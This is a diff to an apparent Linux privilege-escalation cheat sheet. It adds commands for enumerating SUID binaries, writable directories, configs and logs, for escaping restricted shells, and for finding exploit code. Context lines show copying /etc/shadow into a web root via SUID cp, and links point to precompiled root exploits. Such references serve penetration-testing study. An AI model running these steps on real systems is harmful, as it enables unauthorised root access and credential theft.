@@ -20,8 +20,6 @@ dmesg | grep Linux
 ls /boot | grep vmlinuz-
 
 cat /proc/cpuinfo   // CPU information
-df -a   // File system information
-
 
   == What can be learnt from the environmental variables? ==
 cat /etc/profile
@@ -177,11 +175,6 @@ cat /var/spool/cron/crontabs/root
 
     == Interesting Files: ==
 
-find / -perm -4000 -type f 2>/dev/null  // Find SUID files
-find / -uid 0 -perm -4000 -type f 2>/dev/null // Find SUID files owned by root
-find / -perm -2000 -type f 2>/dev/null // Find files with GUID bit set
-find / -perm -2 -type f 2>/dev/null // Find world-writable files
-find / -perm -2 -type d 2>/dev/null // Find word-writable directories
 find /home –name .rhosts -print 2>/dev/null // Find rhost config files
 ls -ahlR /root/     // See if you can access other user directories to find interesting files – Privileged command
 cat ~/.bash_history // Show the current users’ command history
@@ -194,6 +187,29 @@ find /etc/ -maxdepth 1 -name .conf -type f -exec ls -la {} ; 2>/dev/null List .c
 ls -la /etc/.conf As above
 lsof -i -n List open files (output will depend on account privileges)
 
+## Which configuration files can be written in /etc/? Able to reconfigure a service?
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other
+
+find /etc/ -readable -type f 2>/dev/null                         # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone 
+
+## Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
+find / -writable -type d 2>/dev/null        # world-writeable folders
+find / -perm -222 -type d 2>/dev/null      # world-writeable folders
+find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
+
+find / -perm -o+x -type d 2>/dev/null    # world-executable folders
+
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+
+Any "problem" files? Word-writeable, "nobody" files
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+
 ## What sensitive files can be found? 
 cat /etc/passwd
 cat /etc/group
@@ -205,7 +221,65 @@ ls -alh /var/mail/
 ls -ahlR /root/
 ls -ahlR /home/
 
-# Search for specific strings inside a file
+## What can be found in /var/ ? 
+ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd 
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+
+## Any settings/files (hidden) on website? Any settings file with database information?
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/ 
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/ 
+ls -alhR /var/www/html/
+
+## Is there anything in the log file(s) (Could help with "Local File Includes"!)
+# http://www.thegeekstuff.com/2011/08/linux-var-log-files/
+cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access.log
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error.log
+cat /var/log/apache2/access_log
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error_log
+cat /var/log/apache2/error.log
+cat /var/log/apache/access_log
+cat /var/log/apache/access.log
+cat /var/log/auth.log
+cat /var/log/chttp.log
+cat /var/log/cups/error_log
+cat /var/log/dpkg.log
+cat /var/log/faillog
+cat /var/log/httpd/access_log
+cat /var/log/httpd/access.log
+cat /var/log/httpd/error_log
+cat /var/log/httpd/error.log
+cat /var/log/lastlog
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+cat /var/log/lighttpd/lighttpd.access.log
+cat /var/log/lighttpd/lighttpd.error.log
+cat /var/log/messages
+cat /var/log/secure
+cat /var/log/syslog
+cat /var/log/wtmp
+cat /var/log/xferlog
+cat /var/log/yum.log
+cat /var/run/utmp
+cat /var/webmin/miniserv.log
+cat /var/www/logs/access_log
+cat /var/www/logs/access.log
+ls -alh /var/lib/dhcp3/
+ls -alh /var/log/postgresql/
+ls -alh /var/log/proftpd/
+ls -alh /var/log/samba/
+# auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
+
+## Search for specific strings inside a file
 strings ./*.txt | grep password
 grep -l -i pass /var/log/*.log 2>/dev/null
 find / -maxdepth 10 -name *.conf -type f | grep -Hn pass; 2>/dev/null // searches for the string 'password' and output the line number
@@ -224,13 +298,31 @@ cat /root/anaconda-ks.cfg
 find / -name "network-secret.txt"
 locate "network-secret.txt"
  
-## Finds files that have the sticky bit set. 
-find / -perm -u=s -type f 2>/dev/null
-  perm // permission 
-  -f   //regular file
-  u=s  // (sticky)
-  
-  Example:
+    == Permissions ==
+## What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
+find / -perm -u=s -type f 2>/dev/null     #Find FILES that have the sticky bit set. 
+find / -perm -1000 -type d 2>/dev/null    # Find DIRECTORIES w/ Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 
+
+## Where can be written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
+find / -writable -type d 2>/dev/null        # world-writeable folders
+find / -perm -222 -type d 2>/dev/null      # world-writeable folders
+find / -perm -o+w -type d 2>/dev/null    # world-writeable folders
+find / -perm -o+x -type d 2>/dev/null    # world-executable folders
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+Any "problem" files? Word-writeable, "nobody" files
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+
+Example:
 ## We found cp (copy) in the above list and now we are abusing it:
 cp -f --no-preserve=all /etc/shadow /var/www/html/joomla/shadow.txt
 
@@ -241,19 +333,14 @@ Few things to keep in mind:
 ## A lot of ways we can abuse this, update the shadow file with a new account, modify sudoers, plant ssh key + modify sshd_config ## + reboot,or cron.hourly.
 
     == File system ==
-Which configuration files can be written in /etc/? Able to reconfigure a service?
-ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
-ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
-ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
-ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other
+df -ah   // all FS info, including pseudo, duplicate, INACCESSIBLE file systems
 
-find /etc/ -readable -type f 2>/dev/null                         # Anyone
-find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone 
+## Are there any unmounted file-systems?
+cat /etc/fstab
 
 
     == Networking, Routing & Communications: ==
 
-Command Result
 /sbin/ifconfig -a // List all network interfaces
 cat /etc/network/interfaces // As above
 cat /etc/sysconfig/network 
@@ -275,8 +362,11 @@ hostname
 dnsdomainname
 
 
-
     == Common Shell Escape Sequences: ==
+## If commands are limited, you break out of the "jail" shell?
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
 
 :!bash vi, vim
 :set shell=/bin/bash:shell vi, vim
@@ -335,6 +425,45 @@ mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 8
 mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
 
 
-Is tunnelling possible? Send commands locally, remotely
+## Is tunnelling possible? Send commands locally, remotely
 ssh -D 127.0.0.1:9050 -N [username]@[ip] 
 proxychains ifconfig
+
+    == Preparation & Finding Exploit Code ==
+## What development tools/languages are installed/supported?
+find / -name perl*
+find / -name python*
+find / -name gcc* 
+find / -name cc
+
+
+## How can files be uploaded?
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp* 
+find / -name ftp 
+
+
+## Finding exploit code
+http://www.exploit-db.com
+http://1337day.com
+http://www.securiteam.com
+http://www.securityfocus.com
+http://www.exploitsearch.net
+http://metasploit.com/modules/
+http://securityreason.com
+http://seclists.org/fulldisclosure/
+http://www.google.com 
+
+
+## Finding more information regarding the exploit 
+http://www.cvedetails.com
+http://packetstormsecurity.org/files/cve/[CVE]
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
+http://www.vulnview.com/cve-details.php?cvename=[CVE]
+
+
+## (Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk
+http://tarantula.by.ru/localroot/
+http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/
